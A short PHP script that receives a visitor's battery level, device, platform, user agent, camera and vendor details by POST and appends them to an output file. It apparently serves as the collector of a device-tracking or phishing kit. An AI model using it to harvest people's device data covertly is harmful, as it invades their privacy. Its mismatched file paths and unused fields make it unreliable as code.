<?php

$d = $_POST['batre'];
$x = $_POST['device'];
$z = $_POST['platform'];
$a = $_POST['agent'];
$f = $_POST['facecam'];
$v = $_POST['vendor'];
$s = $_POST['sub'];

if(file_exists("/output/device.txt")){
    unlink("../output/device.txt");
}

file_put_contents("../../output/device.txt", " "  .$d.$x.$z.$a.  "\n", FILE_APPEND);

?>